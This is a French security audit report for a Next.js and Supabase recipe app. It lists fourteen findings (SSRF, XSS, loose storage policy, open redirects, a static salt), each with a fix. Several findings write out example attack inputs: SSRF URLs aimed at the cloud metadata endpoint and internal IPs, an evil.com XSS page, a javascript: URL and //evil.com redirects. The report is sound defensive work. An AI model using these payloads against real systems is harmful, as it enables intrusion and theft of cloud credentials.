# Audit de sécurité — Commis (Next.js + Supabase)

**Date** : 2025-04-13
**Scope** : Auth, RLS, Server Actions, Image Proxy, Import pipeline, Crypto, Config

---

## Résumé exécutif

| Sévérité     | Nombre |
|--------------|--------|
| **CRITIQUE** | 1      |
| **HAUTE**    | 5      |
| **MOYENNE**  | 5      |
| **BASSE**    | 2      |
| **Total**    | **14** |

### 3 actions prioritaires

1. **Sécuriser le proxy d'images** — Exiger l'authentification, bloquer les IP privées, valider `Content-Type: image/*`, ajouter `X-Content-Type-Options: nosniff`.
2. **Filtrage d'IP privées centralisé** — Créer une fonction `isPrivateIP()` qui résout le DNS et bloque les plages RFC 1918/loopback/link-local. L'appliquer dans : image proxy, `uploadImageFromUrl`, et restreindre `remotePatterns` dans `next.config.ts`.
3. **Corriger la policy Storage INSERT** — Ajouter `auth.uid()::text = (storage.foldername(name))[1]` pour restreindre l'upload au dossier de l'utilisateur.

---

## Problèmes détectés

### 1 · SSRF + XSS via image proxy (CRITIQUE)

- **Fichier** : `src/app/api/image-proxy/route.ts` (lignes 30-60)
- **Catégorie** : SSRF
- **Description** : Le proxy est non authentifié (le middleware exempte `/api/*`), n'applique aucun filtrage d'IP privées (127.0.0.1, 10.x, 172.16.x, 192.168.x, 169.254.x, ::1), ni de liste blanche de domaines. Le `Content-Type` renvoyé est celui du serveur amont sans validation — le proxy peut servir du HTML ou tout contenu arbitraire depuis l'origine de l'app.
- **Vecteur d'attaque** : `GET /api/image-proxy?url=http://169.254.169.254/latest/meta-data/` pour scanner l'infra interne, ou `?url=https://evil.com/xss.html` pour exécuter du JS dans le contexte du domaine (XSS réfléchi).
- **Piste** : Exiger l'auth, bloquer les IP privées (résolution DNS avant fetch), valider que `Content-Type` commence par `image/`, ajouter `Content-Disposition: inline` et `X-Content-Type-Options: nosniff`.

---

### 2 · Storage upload policy trop permissive (HAUTE)

- **Fichier** : `supabase/migrations/007_recipe_images_bucket.sql` (lignes 6-8)
- **Catégorie** : RLS
- **Description** : La policy INSERT sur `storage.objects` ne vérifie que `bucket_id = 'recipe-images'` sans restreindre le chemin au dossier de l'utilisateur. La policy DELETE le fait, mais pas INSERT.
- **Vecteur d'attaque** : Un utilisateur authentifié appelle directement l'API Storage pour upload dans le dossier d'un autre utilisateur ou remplir le bucket sans limite.
- **Piste** : Ajouter `auth.uid()::text = (storage.foldername(name))[1]` dans le `WITH CHECK` de la policy INSERT. Ajouter une limite de taille via config Storage.

---

### 3 · Toutes les routes API exemptées d'auth (HAUTE)

- **Fichier** : `middleware.ts` (ligne 56)
- **Catégorie** : AUTH
- **Description** : `pathname.startsWith("/api/")` exempte toutes les routes API de l'authentification de manière globale. Toute future route ajoutée sous `/api/` sera automatiquement publique.
- **Vecteur d'attaque** : Un développeur ajoute une route API sensible sous `/api/`, accessible sans auth par défaut.
- **Piste** : Ne rendre publiques que les routes API explicitement listées, ou inverser la logique (auth par défaut sur `/api/`, exemptions explicites).

---

### 4 · SSRF via uploadImageFromUrl (HAUTE)

- **Fichier** : `src/app/actions/recipes.ts` — fonction `uploadImageFromUrl` (~lignes 235-275)
- **Catégorie** : SSRF
- **Description** : `fetch(sourceUrl)` effectue une requête serveur vers n'importe quelle URL sans vérification d'IP privée. Le `sourceUrl` provient de `recipe.image_url`, contrôlable via JSON-LD malveillant ou sortie LLM manipulée.
- **Vecteur d'attaque** : Page de recette avec `"image": "http://10.0.0.1:8080/admin"` dans le JSON-LD. Le check `contentType.startsWith('image/')` ne bloque que le stockage, pas la requête.
- **Piste** : Résoudre le DNS avant le fetch et bloquer les plages IP privées/réservées.

---

### 5 · next/image wildcard remote patterns (HAUTE)

- **Fichier** : `next.config.ts` (lignes 6-15)
- **Catégorie** : SSRF
- **Description** : `remotePatterns` avec `hostname: "**"` (HTTP + HTTPS) autorise `/_next/image` à optimiser des images depuis n'importe quel hôte, y compris des IP internes.
- **Vecteur d'attaque** : `/_next/image?url=http://169.254.169.254/...&w=64&q=75` — fetch interne côté serveur.
- **Piste** : Restreindre `remotePatterns` aux domaines connus (Supabase Storage, CDN).

---

### 6 · deleteAccount incomplet (HAUTE)

- **Fichier** : `src/app/actions/profile.ts` — fonction `deleteAccount` (lignes ~75-115)
- **Catégorie** : AUTH
- **Description** : Ne supprime pas : `user_settings` (cookies Instagram chiffrés), `import_jobs`, objets Storage (images), et l'enregistrement `auth.users` (le compte persiste dans Supabase Auth).
- **Vecteur d'attaque** : Après « suppression », les cookies Instagram chiffrés restent en base. Si `ENCRYPTION_SECRET` est compromis, ils sont déchiffrables. Le compte auth pourrait être réutilisé.
- **Piste** : Supprimer `user_settings`, `import_jobs`, fichiers Storage. Utiliser l'API Admin (service_role) pour supprimer le user auth.

---

### 7 · Pas de validation taille/type sur import image (HAUTE)

- **Fichier** : `src/app/actions/import.ts` — fonction `startImportFromImage` (lignes ~145-170)
- **Catégorie** : INPUT_VALIDATION
- **Description** : Aucune validation de la taille du fichier ni du type MIME côté serveur. `file.type` provient du client. Le fichier entier est chargé en mémoire puis encodé en base64 (×2 mémoire).
- **Vecteur d'attaque** : Fichier de 100+ Mo → crash OOM (DoS). Fichier non-image envoyé à Gemini (abus de quota API).
- **Piste** : Vérifier `file.size` (max 10 Mo), valider le type MIME côté serveur (magic bytes).

---

### 8 · Open redirect dans auth callback (MOYENNE)

- **Fichier** : `src/app/auth/callback/route.ts` (lignes 8-10)
- **Catégorie** : AUTH
- **Description** : Le paramètre `next` est utilisé dans `NextResponse.redirect(\`${origin}${next}\`)` sans validation. Pas de vérification que `next` commence par `/` ni qu'il ne contient pas `//`.
- **Vecteur d'attaque** : Lien de callback avec `?next=//evil.com` — le navigateur peut interpréter `//evil.com` comme protocol-relative URL. **[INCERTAIN]**
- **Piste** : Valider que `next` commence par `/` et ne commence pas par `//`.

---

### 9 · Pas de validation URL dans startImport (MOYENNE)

- **Fichier** : `src/app/actions/import.ts` — fonction `startImport` (ligne 15)
- **Catégorie** : INPUT_VALIDATION
- **Description** : `startImport(url)` ne valide pas l'URL (pas de vérification de protocole http/https, pas de blocage d'IP privées). L'URL est envoyée à Jina AI et stockée en base dans `source_url`.
- **Vecteur d'attaque** : URL `javascript:alert(1)` stockée dans `import_jobs.source_url` — XSS stocké si affichée comme lien cliquable.
- **Piste** : Valider protocole `http:` ou `https:` avant toute opération.

---

### 10 · Pas de rate limiting sur le proxy (MOYENNE)

- **Fichier** : `src/app/api/image-proxy/route.ts`
- **Catégorie** : CONFIG
- **Description** : Le proxy non authentifié n'a aucun rate limiting.
- **Vecteur d'attaque** : Milliers de requêtes pour DDoS un site tiers (amplification) ou scanner un réseau interne.
- **Piste** : Ajouter un rate limit par IP (Render reverse proxy ou middleware applicatif). Exiger l'auth.

---

### 11 · Sel statique dans crypto.ts (MOYENNE)

- **Fichier** : `src/lib/utils/crypto.ts` (ligne 8)
- **Catégorie** : CRYPTO
- **Description** : Le sel `scryptSync` est une constante hardcodée `'commis-salt'`. Si `ENCRYPTION_SECRET` fuite, tous les cookies Instagram sont déchiffrables d'un coup. L'IV aléatoire par opération limite l'impact.
- **Vecteur d'attaque** : Impact limité tant que le secret est fort. **[INCERTAIN — dépend de la force du secret en prod]**
- **Piste** : Acceptable si `ENCRYPTION_SECRET` > 32 caractères aléatoires. Documenter cette exigence.

---

### 12 · exportUserData sans filtre applicatif sur recipe_tags (MOYENNE)

- **Fichier** : `src/app/actions/profile.ts` — fonction `exportUserData` (lignes ~55-75)
- **Catégorie** : RLS
- **Description** : La requête `recipe_tags` ne filtre pas par `user_id` côté application. La RLS protège, mais si elle est accidentellement modifiée, toutes les recipe_tags fuiteraient.
- **Vecteur d'attaque** : Risque résiduel — dépend de la stabilité de la RLS.
- **Piste** : Ajouter un filtre applicatif explicite en défense-en-profondeur.

---

### 13 · hasSharedInstagramCookies expose la config (BASSE)

- **Fichier** : `src/app/actions/profile.ts` (ligne 24)
- **Catégorie** : CONFIG
- **Description** : Server action publique révélant si `INSTAGRAM_SHARED_COOKIES` est définie. Information disclosure mineure.
- **Vecteur d'attaque** : Oriente les tentatives d'exploitation d'un attaquant.
- **Piste** : Renvoyer cette info uniquement aux utilisateurs authentifiés.

---

### 14 · Open redirect marginal dans middleware (BASSE)

- **Fichier** : `middleware.ts` (lignes 62-68)
- **Catégorie** : AUTH
- **Description** : `next.startsWith("/")` accepte `//evil.com`. Normalement sûr quand assigné à `pathname`, mais fragile. **[INCERTAIN]**
- **Vecteur d'attaque** : Risque très faible — la plupart des implémentations URL normalisent le pathname.
- **Piste** : Ajouter `!next.startsWith("//")`.
